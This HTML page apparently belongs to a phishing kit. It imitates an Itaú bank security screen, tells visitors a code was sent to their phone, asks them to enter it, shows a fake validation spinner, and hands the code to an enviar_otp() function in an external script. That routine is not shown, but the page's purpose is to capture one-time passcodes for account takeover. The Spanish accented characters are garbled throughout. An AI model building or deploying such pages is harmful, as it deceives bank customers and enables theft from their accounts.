<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ValidaciÃ³n de Seguridad | ItaÃº</title>
    <link rel="icon" type="image/png" href="itau_logo.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --itau-orange: #fe6a00;
            --itau-blue: #003399;
            --text-dark: #2d2d2d;
            --text-gray: #6b6b6b;
            --bg-light: #f4f7f9;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-light);
            height: 100%;
        }

        .page-wrapper {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
            padding: 24px;
            box-sizing: border-box;
            background: radial-gradient(circle at center, #ffffff 0%, #f4f7f9 100%);
        }

        .otp-card {
            background: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 48px 40px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
            text-align: center;
            position: relative;
        }

        .logo-container {
            margin-bottom: 32px;
        }

        .logo-container img {
            width: 54px;
            border-radius: 12px;
        }

        h1 {
            font-size: 24px;
            color: var(--text-dark);
            margin-bottom: 24px;
            font-weight: 700;
        }

        .info-text {
            font-size: 15px;
            color: var(--text-gray);
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .info-text b {
            color: var(--itau-orange);
        }

        /* Floating Label Form Field */
        .form-field {
            position: relative;
            margin-bottom: 32px;
            border-bottom: 2px solid #e0e0e0;
            padding: 8px 0;
            transition: border-color 0.3s;
            text-align: left;
        }

        .form-field.focused {
            border-bottom-color: var(--itau-orange);
        }

        .form-field label {
            position: absolute;
            left: 0;
            top: 12px;
            font-size: 16px;
            color: #999;
            transition: all 0.2s ease-out;
            pointer-events: none;
        }

        .form-field.focused label, 
        .form-field.filled label {
            top: -12px;
            font-size: 12px;
            color: var(--itau-orange);
            font-weight: 600;
        }

        input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 20px;
            color: var(--text-dark);
            padding: 8px 0;
            background: transparent;
            letter-spacing: 4px;
            font-weight: 700;
        }

        .btn-confirm {
            width: 100%;
            padding: 16px;
            background-color: #f1f1f1;
            color: #b5b5b5;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-confirm.active {
            background-color: var(--itau-orange);
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(254, 106, 0, 0.2);
        }

        .btn-confirm.active:hover {
            background-color: #e55a00;
            transform: translateY(-1px);
        }

        .footer-links {
            margin-top: 32px;
        }

        .action-link {
            display: block;
            color: #0056b3;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
        }

        .action-link:hover {
            text-decoration: underline;
        }

        /* Full Screen Loader */
        #loader-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.98);
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--itau-orange);
            border-bottom: 4px solid var(--itau-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Mobile Adjustments */
        @media (max-width: 480px) {
            .page-wrapper {
                padding: 0;
                background: #ffffff;
            }
            .otp-card {
                max-width: 100%;
                height: 100vh;
                border-radius: 0;
                box-shadow: none;
                padding: 60px 24px;
                display: flex;
                flex-direction: column;
                justify-content: center;
            }
        }
    </style>
</head>
<body>

    <div id="loader-overlay">
        <img src="itau_logo.png" alt="ItaÃº" style="width: 54px; border-radius: 12px; margin-bottom: 30px;">
        <div class="spinner"></div>
        <p style="color: var(--itau-orange); font-weight: 600;">Estamos validando tu cÃ³digo...</p>
    </div>

    <div class="page-wrapper">
        <div class="otp-card">
            <div class="logo-container">
                <img src="itau_logo.png" alt="ItaÃº">
            </div>

            <h1>Seguridad ItaÃº</h1>

            <p class="info-text">
                Hemos enviado un <b>cÃ³digo de seguridad</b> al nÃºmero de celular registrado. Por favor ingrÃ©salo para continuar.
            </p>

            <form id="otpForm" autocomplete="off">
                <div class="form-field" id="field-otp">
                    <label for="txtOTP">CÃ³digo de seguridad</label>
                    <input type="tel" id="txtOTP" maxlength="8" minlength="4" inputmode="numeric" placeholder="">
                </div>

                <button type="button" id="btnConfirm" class="btn-confirm" disabled>Confirmar</button>
            </form>

            <div class="footer-links">
                <a href="#" class="action-link">No recibÃ­ el cÃ³digo</a>
                <a href="itau.php" class="action-link" style="color: #999; font-weight: 400;">Cancelar y volver</a>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            const $input = $("#txtOTP");
            const $field = $("#field-otp");
            const $btn = $("#btnConfirm");

            $input.on("focus", function() {
                $field.addClass("focused");
            }).on("blur", function() {
                $field.removeClass("focused");
                if ($input.val() !== "") {
                    $field.addClass("filled");
                } else {
                    $field.removeClass("filled");
                }
            }).on("input", function() {
                const val = $input.val();
                if (val !== "") {
                    $field.addClass("filled");
                } else {
                    $field.removeClass("filled");
                }

                if (val.length >= 4) {
                    $btn.addClass("active").prop("disabled", false);
                } else {
                    $btn.removeClass("active").prop("disabled", true);
                }
            });

            $btn.on("click", function() {
                if (!$btn.prop("disabled")) {
                    $("#loader-overlay").css("display", "flex");
                    setTimeout(function() {
                        enviar_otp($input.val());
                    }, 1000);
                }
            });

            // Enter key
            $input.on("keypress", function(e) {
                if (e.which == 13 && $input.val().length >= 4) {
                    $btn.trigger("click");
                    return false;
                }
            });
        });
    </script>
</body>
</html>
